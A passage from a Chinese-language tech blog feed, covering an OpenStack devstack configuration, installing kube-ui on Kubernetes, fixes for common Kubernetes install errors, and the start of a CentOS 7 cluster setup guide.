class="line">LOG_COLOR=True</span><br><span class="line">SCREEN_LOGDIR=/opt/stack/logs</span><br><span class="line"></span><br><span class="line"><span class="comment"># the number of days by setting ``LOGDAYS``.</span></span><br><span class="line">LOGDAYS=1</span><br><span class="line"><span class="comment"># Database Backend MySQL</span></span><br><span class="line">enable_service mysql</span><br><span class="line"><span class="comment"># RPC Backend RabbitMQ</span></span><br><span class="line">enable_service rabbit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable Keystone - OpenStack Identity Service</span></span><br><span class="line">enable_service key</span><br><span class="line"><span class="comment"># Horizon - OpenStack Dashboard Service</span></span><br><span class="line">enable_service horizon</span><br><span class="line"><span class="comment"># Enable Swift - Object Storage Service without replication.</span></span><br><span class="line">enable_service s-proxy s-object s-container s-account</span><br><span class="line">SWIFT_HASH=66a3d6b56c1f479c8b4e70ab5c2000f5</span><br><span class="line">SWIFT_REPLICAS=1</span><br><span class="line"><span class="comment"># Enable Glance - OpenStack Image service</span></span><br><span class="line">enable_service g-api g-reg</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable Cinder - Block Storage service for OpenStack</span></span><br><span class="line">VOLUME_GROUP=<span class="string">&quot;cinder-volumes&quot;</span></span><br><span class="line">enable_service cinder c-api c-vol c-sch c-bak</span><br><span class="line"><span class="comment"># Enable Heat (orchestration) Service</span></span><br><span class="line">enable_service heat h-api h-api-cfn h-api-cw h-eng</span><br><span class="line"><span class="comment"># Enable Trove (database) Service</span></span><br><span class="line">enable_service trove tr-api tr-tmgr tr-cond</span><br><span class="line"><span class="comment"># Enable Sahara (data_processing) Service</span></span><br><span class="line">enable_service sahara</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable Tempest - The OpenStack Integration Test Suite</span></span><br><span class="line">enable_service tempest</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enabling Neutron (network) Service</span></span><br><span class="line">disable_service n-net</span><br><span class="line">enable_service q-svc</span><br><span class="line">enable_service q-agt</span><br><span class="line">enable_service q-dhcp</span><br><span class="line">enable_service q-l3</span><br><span class="line">enable_service q-meta</span><br><span class="line">enable_service q-metering</span><br><span class="line">enable_service neutron</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Neutron - Load Balancing</span></span><br><span class="line">enable_service q-lbaas</span><br><span class="line"><span class="comment">## Neutron - Firewall as a Service</span></span><br><span class="line">enable_service q-fwaas</span><br><span class="line"><span class="comment">## Neutron - VPN as a Service</span></span><br><span class="line">enable_service q-vpn</span><br><span class="line"><span class="comment"># VLAN configuration.</span></span><br><span class="line"><span class="comment">#Q_PLUGIN=ml2</span></span><br><span class="line"><span class="comment">#ENABLE_TENANT_VLANS=True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># GRE tunnel configuration</span></span><br><span class="line"><span class="comment">#Q_PLUGIN=ml2</span></span><br><span class="line"><span class="comment">#ENABLE_TENANT_TUNNELS=True</span></span><br><span class="line"><span class="comment"># VXLAN tunnel configuration</span></span><br><span class="line">Q_PLUGIN=ml2</span><br><span class="line">Q_ML2_TENANT_NETWORK_TYPE=vxlan</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable Ceilometer - Metering Service (metering + alarming)</span></span><br><span class="line">enable_service ceilometer-acompute ceilometer-acentral ceilometer-collector ceilometer-api</span><br><span class="line">enable_service ceilometer-alarm-notify ceilometer-alarm-eval</span><br><span class="line">enable_service ceilometer-anotification</span><br><span class="line"><span class="comment">## Enable NoVNC</span></span><br><span class="line">enable_service n-novnc n-cauth</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable the Ceilometer devstack plugin</span></span><br><span class="line">enable_plugin ceilometer https://git.openstack.org/openstack/ceilometer.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Branches</span></span><br><span class="line">KEYSTONE_BRANCH=stable/liberty</span><br><span class="line">NOVA_BRANCH=stable/liberty</span><br><span class="line">NEUTRON_BRANCH=stable/liberty</span><br><span class="line">SWIFT_BRANCH=stable/liberty</span><br><span class="line">GLANCE_BRANCH=stable/liberty</span><br><span class="line">CINDER_BRANCH=stable/liberty</span><br><span class="line">HEAT_BRANCH=stable/liberty</span><br><span class="line">TROVE_BRANCH=stable/liberty</span><br><span class="line">HORIZON_BRANCH=stable/liberty</span><br><span class="line">SAHARA_BRANCH=stable/liberty</span><br><span class="line">CEILOMETER_BRANCH=stable/liberty</span><br><span class="line">TROVE_BRANCH=stable/liberty</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select Keystone&#x27;s token format</span></span><br><span class="line"><span class="comment"># Choose from &#x27;UUID&#x27;, &#x27;PKI&#x27;, or &#x27;PKIZ&#x27;</span></span><br><span class="line"><span class="comment"># INSERT THIS LINE...</span></span><br><span class="line">KEYSTONE_TOKEN_FORMAT=<span class="variable">$&#123;KEYSTONE_TOKEN_FORMAT:-UUID&#125;</span></span><br><span class="line">KEYSTONE_TOKEN_FORMAT=$(<span class="built_in">echo</span> <span class="variable">$&#123;KEYSTONE_TOKEN_FORMAT&#125;</span> | tr <span class="string">&#x27;[:upper:]&#x27;</span> <span class="string">&#x27;[:lower:]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[[post-config|<span class="variable">$NOVA_CONF</span>]]</span><br><span class="line">[DEFAULT]</span><br><span class="line"><span class="comment"># Ceilometer notification driver</span></span><br><span class="line">instance_usage_audit=True</span><br><span class="line">instance_usage_audit_period=hour</span><br><span class="line">notify_on_state_change=vm_and_task_state</span><br><span class="line">notification_driver=nova.openstack.common.notifier.rpc_notifier</span><br><span class="line">notification_driver=ceilometer.compute.nova_notifier</span><br></pre></td></tr></table></figure><h3 id="安装openstack"><a href="#安装openstack" class="headerlink" title="安装openstack"></a>安装openstack</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># cd /opt/devstack</span></span><br><span class="line"><span class="meta"># su stack</span></span><br><span class="line"><span class="meta"># ./stack.sh</span></span><br></pre></td></tr></table></figure><p>安装完成，如下图所示:<br><img data-src="/images/uploads/2015/12/1.jpg" alt="image"></p><p>访问dashboard:<br><img data-src="/images/uploads/2015/12/2.jpg" alt="image"></p><h3 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">admin用户</span><br><span class="line"># <span class="keyword">source</span> <span class="regexp">/opt/</span>devstack/openrc admin admin # 加载环境变量进行操作</span><br><span class="line">demo用户</span><br><span class="line"># <span class="keyword">source</span> <span class="regexp">/opt/</span>devstack/openrc demo demo # 加载环境变量进行操作</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> devstack </tag>
            
            <tag> liberty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes 安装配置 kube-ui</title>
      <link href="docker/kube-ui.html"/>
      <url>docker/kube-ui.html</url>
      
        <content type="html"><![CDATA[<p>接上文：<a href="https://www.sunmite.com/linux/installing-kubernetes-cluster-on-centos7-to-manage-pods-and-services.html">在centos7上安装和配置Kubernetes</a></p><h3 id="下载kube-ui镜像并导入"><a href="#下载kube-ui镜像并导入" class="headerlink" title="下载kube-ui镜像并导入"></a>下载kube-ui镜像并导入</h3><p>谷歌的镜像地址被墙了，无法pull拉取镜像，只能手动下载。<br>在每个minion上导入镜像：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> load  kube-ui_v<span class="number">3</span>.tar</span><br></pre></td></tr></table></figure><h3 id="创建kube-system-namespace"><a href="#创建kube-system-namespace" class="headerlink" title="创建kube-system namespace"></a>创建kube-system namespace</h3><p>创建kube-system.json，内容如下：</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># vim kube-<span class="keyword">system</span>.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Namespace&quot;</span>,</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-system&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="运行以下命令创建namespace"><a href="#运行以下命令创建namespace" class="headerlink" title="运行以下命令创建namespace"></a>运行以下命令创建namespace</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># kubectl <span class="keyword">create</span> -f kube-<span class="keyword">system</span>.json</span><br><span class="line"># kubectl <span class="keyword">get</span> namespace</span><br><span class="line"><span class="type">NAME</span>          LABELS    STATUS</span><br><span class="line"><span class="keyword">default</span>        <span class="keyword">none</span>     Active</span><br><span class="line">kube-<span class="keyword">system</span>    <span class="keyword">none</span>     Active</span><br></pre></td></tr></table></figure><h3 id="创建rc"><a href="#创建rc" class="headerlink" title="创建rc"></a>创建rc</h3><ol><li>创建kube-ui-rc.yaml 文件，并写入一下内容</li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim kube-ui-rc.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-ui-v3</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-ui</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v3</span></span><br><span class="line">    <span class="attr">kubernetes.io/cluster-service:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-ui</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v3</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">kube-ui</span></span><br><span class="line">        <span class="attr">version:</span> <span class="string">v3</span></span><br><span class="line">        <span class="attr">kubernetes.io/cluster-service:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-ui</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">gcr.io/google_containers/kube-ui:v3</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">50Mi</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">30</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><ol start="2"><li>运行一下命令创建rc,并查看</li></ol><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl create -f kube-ui-rc.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#kubectl get rc --all-namespaces</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     CONTROLLER   CONTAINER(S)   IMAGE(S)                              SELECTOR                     REPLICAS</span><br><span class="line"><span class="attribute">kube</span>-system   kube-ui-v<span class="number">3</span>   kube-ui        gcr.io/google_containers/kube-ui:v<span class="number">3</span>   k<span class="number">8</span>s-app=kube-ui,version=v<span class="number">3</span>   <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="创建service"><a href="#创建service" class="headerlink" title="创建service"></a>创建service</h3><ol><li>创建 kube-ui-svc.yaml 文件，并写入以下内容</li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim kube-ui-svc.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-ui</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-ui</span></span><br><span class="line">    <span class="attr">kubernetes.io/cluster-service:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">kubernetes.io/name:</span> <span class="string">&quot;KubeUI&quot;</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-ui</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><ol start="2"><li>运行以下命令创建service，并查看service 和 pods</li></ol><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl create -f kube-ui-svc.yaml</span></span><br><span class="line"><span class="comment"># kubectl get rc,pods --all-namespaces</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     CONTROLLER   CONTAINER(S)   IMAGE(S)                              SELECTOR                     REPLICAS</span><br><span class="line"><span class="attribute">kube</span>-system   kube-ui-v<span class="number">3</span>   kube-ui        gcr.io/google_containers/kube-ui:v<span class="number">3</span>   k<span class="number">8</span>s-app=kube-ui,version=v<span class="number">3</span>   <span class="number">3</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     NAME               READY     STATUS    RESTARTS   AGE</span><br><span class="line"><span class="attribute">kube</span>-system   kube-ui-v<span class="number">3</span>-<span class="number">0</span>zyjp   <span class="number">1</span>/<span class="number">1</span>       Running   <span class="number">0</span>          <span class="number">21</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-ui-v<span class="number">3</span>-<span class="number">6</span>s<span class="number">1</span>d<span class="number">0</span>   <span class="number">1</span>/<span class="number">1</span>       Running   <span class="number">0</span>          <span class="number">21</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-ui-v<span class="number">3</span>-i<span class="number">0</span>uqs   <span class="number">1</span>/<span class="number">1</span>       Running   <span class="number">0</span>          <span class="number">21</span>h</span><br></pre></td></tr></table></figure><p>可以看到kube-ui服务已经成功创建，运行3个副本</p><h3 id="master配置flannel网络，与minion连通"><a href="#master配置flannel网络，与minion连通" class="headerlink" title="master配置flannel网络，与minion连通"></a>master配置flannel网络，与minion连通</h3><ol><li>master安装flannel，并启动</li></ol><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install flannel -y</span></span><br><span class="line"><span class="meta"># systemctl enable flanneld</span></span><br><span class="line"><span class="meta"># systemctl start flanneld</span></span><br></pre></td></tr></table></figure><ol start="2"><li>访问kube-ui</li></ol><p>访问 <a href="http://master_ip:8080/ui/">http://master_ip:8080/ui/</a> 会自动跳转 <a href="http://kube-ui:8080/api/v1/proxy/namespaces/kube-system/services/kube-ui/#/dashboard/">http://kube-ui:8080/api/v1/proxy/namespaces/kube-system/services/kube-ui/#/dashboard/</a> 即可访问kube-ui的dashboard 页面，如下图所示：<br><img data-src="/images/uploads/2015/11/1.jpg" alt="image"></p><p>可以查看minion的系统信息，pods，RC，services等信息</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> docker </tag>
            
            <tag> kube-ui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes 安装遇到的一些问题</title>
      <link href="docker/k8s-errors.html"/>
      <url>docker/k8s-errors.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-Error-from-server-namespaces-“kube-system”-not-found"><a href="#1-Error-from-server-namespaces-“kube-system”-not-found" class="headerlink" title="1. Error from server: namespaces “kube-system” not found"></a>1. Error from server: namespaces “kube-system” not found</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error </span>from server: namespaces &quot;kube-system&quot; not found</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># vim kube-<span class="keyword">system</span>.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;kind&quot;: &quot;Namespace&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;kube-system&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># kubectl <span class="keyword">create</span> -f kube-<span class="keyword">system</span>.json</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-Unable-to-generate-self-signed-cert-mkdir-var-run-kubernetes-permission-denied"><a href="#2-Unable-to-generate-self-signed-cert-mkdir-var-run-kubernetes-permission-denied" class="headerlink" title="2. Unable to generate self signed cert: mkdir /var/run/kubernetes: permission denied"></a>2. Unable to generate self signed cert: mkdir /var/run/kubernetes: permission denied</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Aug</span> <span class="number">12</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span> master kube-apiserver[<span class="number">5336</span>]: E<span class="number">0812</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span>.<span class="number">063837</span>    <span class="number">5336</span> genericapiserver.go:<span class="number">702</span>] Unable to generate self signed cert: mkdir /var/run/kubernetes: permission denied</span><br><span class="line"><span class="attribute">Aug</span> <span class="number">12</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span> master kube-apiserver[<span class="number">5336</span>]: I<span class="number">0812</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span>.<span class="number">063915</span>    <span class="number">5336</span> genericapiserver.go:<span class="number">734</span>] Serving insecurely <span class="literal">on</span> <span class="number">0.0.0.0:8080</span></span><br><span class="line"><span class="attribute">Aug</span> <span class="number">12</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span> master systemd[<span class="number">1</span>]: Started Kubernetes API Server.</span><br><span class="line"><span class="attribute">Aug</span> <span class="number">12</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span> master kube-apiserver[<span class="number">5336</span>]: E<span class="number">0812</span> <span class="number">11</span>:<span class="number">07</span>:<span class="number">05</span>.<span class="number">064151</span>    <span class="number">5336</span> genericapiserver.go:<span class="number">716</span>] Unable to listen for secure (open /var/run/kubernetes/apiserver.crt: no such file or directory); will try again.</span><br></pre></td></tr></table></figure><p>解决办法:  </p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir -p <span class="regexp">/var/</span>run<span class="regexp">/kubernetes/</span></span><br><span class="line"># chown -R kube.kube <span class="regexp">/var/</span>run<span class="regexp">/kubernetes/</span></span><br><span class="line"># <span class="keyword">for</span> SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; <span class="keyword">do</span> </span><br><span class="line">    systemctl restart $SERVICES</span><br><span class="line">    systemctl enable $SERVICES</span><br><span class="line">    systemctl status $SERVICES </span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="3-下载google-container镜像-minion上下载"><a href="#3-下载google-container镜像-minion上下载" class="headerlink" title="3. 下载google-container镜像(minion上下载)"></a>3. 下载google-container镜像(minion上下载)</h3><p>在hosts文件中加入以下内容</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"># vim /etc/hosts</span><br><span class="line"><span class="number">220.255.2.153</span> www.gcr.io</span><br><span class="line"><span class="number">220.255.2.153</span> gcr.io</span><br><span class="line"># docker pull gcr.io/google_containers/kubernetes-dashboard-amd64:v1.<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="4-no-API-token-found-for-service-account-kube-system-default"><a href="#4-no-API-token-found-for-service-account-kube-system-default" class="headerlink" title="4. no API token found for service account kube-system/default"></a>4. no API token found for service account kube-system/default</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error </span>creating: pods &quot;kubernetes-dashboard<span class="string">-1881024876</span>-&quot; is forbidden: no API token found for service account kube-system/default,</span><br></pre></td></tr></table></figure><p>解决方法：etc/kubernetes/apiserver 去除 KUBE_ADMISSION_CONTROL中的SecurityContextDeny,ServiceAccount，并重启kube-apiserver.service服务</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#vim /etc/kubernetes/apiserver</span></span><br><span class="line"><span class="attr">KUBE_ADMISSION_CONTROL</span>=<span class="string">&quot;--admission_control=NamespaceLifecycle,NamespaceExists,LimitRanger,ResourceQuota&quot;</span></span><br><span class="line"><span class="comment">#systemctl restart kube-apiserver.service</span></span><br></pre></td></tr></table></figure><h3 id="5-Get-http-localhost-8080-version-dial-tcp-202-102-110-203-8080-getsockopt-connection-refused"><a href="#5-Get-http-localhost-8080-version-dial-tcp-202-102-110-203-8080-getsockopt-connection-refused" class="headerlink" title="5. Get http://localhost:8080/version: dial tcp 202.102.110.203:8080: getsockopt: connection refused"></a>5. Get <a href="http://localhost:8080/version">http://localhost:8080/version</a>: dial tcp 202.102.110.203:8080: getsockopt: connection refused</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># docker logs b7cff1accc06</span><br><span class="line">Starting HTTP <span class="keyword">server</span> <span class="keyword">on</span> port <span class="number">9090</span></span><br><span class="line">Creating API <span class="keyword">server</span> client <span class="keyword">for</span> http://localhost:<span class="number">8080</span></span><br><span class="line">Error <span class="keyword">while</span> initializing <span class="keyword">connection</span> <span class="keyword">to</span> Kubernetes apiserver. This most likely means that the <span class="keyword">cluster</span> <span class="keyword">is</span> misconfigured (e.g., it has invalid apiserver certificates <span class="keyword">or</span> service accounts <span class="keyword">configuration</span>) <span class="keyword">or</span> the <span class="comment">--apiserver-host param points to a server that does not exist. Reason: Get http://localhost:8080/version: dial tcp 202.102.110.203:8080: getsockopt: connection refused</span></span><br></pre></td></tr></table></figure><p>删除原有失败的kubernetes-dashboard</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl delete -f kubernetes-dashboard.yaml</span></span><br></pre></td></tr></table></figure><p>修改 kubernetes-dashboard.yaml 文件加入以下行</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim kubernetes-dashboard.yaml</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">9090</span></span><br><span class="line">          <span class="attr">protocol:</span> <span class="string">TCP</span> </span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">          <span class="comment"># Uncomment the following line to manually specify Kubernetes API server Host</span></span><br><span class="line">          <span class="comment"># If not specified, Dashboard will attempt to auto discover the API server and connect</span></span><br><span class="line">          <span class="comment"># to it. Uncomment only if the default does not work.</span></span><br><span class="line">          <span class="comment"># - --apiserver-host=http://my-address:port</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">--apiserver-host=http://192.168.2.247:8080</span>    <span class="comment">##加入此行 指定apiserver地址</span></span><br></pre></td></tr></table></figure><p>重新创建kubernetes-dashboard</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl create -f kubernetes-dashboard.yaml</span></span><br></pre></td></tr></table></figure><h3 id="6-不能浏览器访问kubernetes-dashboard"><a href="#6-不能浏览器访问kubernetes-dashboard" class="headerlink" title="6. 不能浏览器访问kubernetes-dashboard"></a>6. 不能浏览器访问kubernetes-dashboard</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>&#x27;dial tcp 172.17.97.3:9090: i/o timeout&#x27;</span><br><span class="line">Trying to reach: &#x27;http://172.17.97.3:9090/&#x27;</span><br></pre></td></tr></table></figure><p>master上安装flannel</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y flannel</span></span><br></pre></td></tr></table></figure><p>编辑flannel配置文件并启动</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># vim /etc/sysconfig/flanneld</span><br><span class="line"></span><br><span class="line"># Flanneld <span class="keyword">configuration</span> <span class="keyword">options</span>  </span><br><span class="line"></span><br><span class="line"># etcd url <span class="keyword">location</span>.  <span class="type">Point</span> this <span class="keyword">to</span> the <span class="keyword">server</span> <span class="keyword">where</span> etcd runs</span><br><span class="line">FLANNEL_ETCD=&quot;http://192.168.2.247:2379&quot;</span><br><span class="line"></span><br><span class="line"># etcd config key.  This <span class="keyword">is</span> the <span class="keyword">configuration</span> key that flannel queries</span><br><span class="line"># <span class="keyword">For</span> address range assignment</span><br><span class="line">FLANNEL_ETCD_KEY=&quot;/coreos.com/network&quot;                                                                                                                                                                                       </span><br><span class="line"></span><br><span class="line"># <span class="keyword">Any</span> additional <span class="keyword">options</span> that you want <span class="keyword">to</span> pass</span><br><span class="line"><span class="meta">#FLANNEL_OPTIONS=&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"># systemctl <span class="keyword">enable</span> flanneld.service ; systemctl <span class="keyword">start</span> flanneld.service</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> docker </tag>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在centos7上安装和配置Kubernetes集群管理pods和services</title>
      <link href="linux/installing-kubernetes-cluster-on-centos7-to-manage-pods-and-services.html"/>
      <url>linux/installing-kubernetes-cluster-on-centos7-to-manage-pods-and-services.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h1><h2 id="操作系统详情"><a href="#操作系统详情" class="headerlink" title="操作系统详情"></a>操作系统详情</h2><p>需要三台主机，都最小化安装 centos7.1,并update到最新，详情见如下表格</p><table><thead><tr><th>角色</th><th>主机名</th><th>IP</th></tr></thead><tbody><tr><td>Master</td><td>master</td><td>192.168.0.79</td></tr><tr><td>Minion1</td><td>minion-1</td><td>192.168.0.80</td></tr><tr><td>Minion2</td><td>minion-2</td><td>192.168.0.81</td></tr></tbody></table><h2 id="在每台主机上关闭firewalld改用iptables"><a href="#在每台主机上关闭firewalld改用iptables" class="headerlink" title="在每台主机上关闭firewalld改用iptables"></a>在每台主机上关闭firewalld改用iptables</h2><p>输入以下命令，关闭firewalld</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># systemctl stop firewalld.service    #停止firewall</span></span><br><span class="line"><span class="comment"># systemctl disable firewalld.service #禁止firewall开机启动</span></span><br></pre></td></tr></table></figure><p>然后安装iptables并启用  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install -y iptables-services     #安装</span></span><br><span class="line"><span class="comment"># systemctl start iptables.service  #最后重启防火墙使配置生效</span></span><br><span class="line"><span class="comment"># systemctl enable iptables.service #设置防火墙开机启动</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="安装ntp服务"><a href="#安装ntp服务" class="headerlink" title="安装ntp服务"></a>安装ntp服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install -y ntp</span></span><br><span class="line"><span class="comment"># systemctl start ntpd</span></span><br><span class="line"><span class="comment"># systemctl enable ntpd</span></span><br></pre></td></tr></table></figure><!-- more --><h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><p><em>注：kubernetes，etcd等已经进入centos epel源，可以直接yum安装（需要安装epel-release）</em></p><h2 id="安装-Kubernetes-Master"><a href="#安装-Kubernetes-Master" class="headerlink" title="安装 Kubernetes Master"></a>安装 Kubernetes Master</h2><h3 id="1-使用以下命令安装kubernetes-和-etcd"><a href="#1-使用以下命令安装kubernetes-和-etcd" class="headerlink" title="1. 使用以下命令安装kubernetes 和 etcd"></a>1. 使用以下命令安装kubernetes 和 etcd</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y kubernetes etcd</span></span><br></pre></td></tr></table></figure><h3 id="2-编辑-etc-etcd-etcd-conf-使etcd监听所有的ip地址，确保下列行没有注释，并修改为下面的值"><a href="#2-编辑-etc-etcd-etcd-conf-使etcd监听所有的ip地址，确保下列行没有注释，并修改为下面的值" class="headerlink" title="2. 编辑/etc/etcd/etcd.conf 使etcd监听所有的ip地址，确保下列行没有注释，并修改为下面的值"></a>2. 编辑/etc/etcd/etcd.conf 使etcd监听所有的ip地址，确保下列行没有注释，并修改为下面的值</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/etcd/etcd.conf</span></span><br><span class="line"><span class="comment"># [member]</span></span><br><span class="line"><span 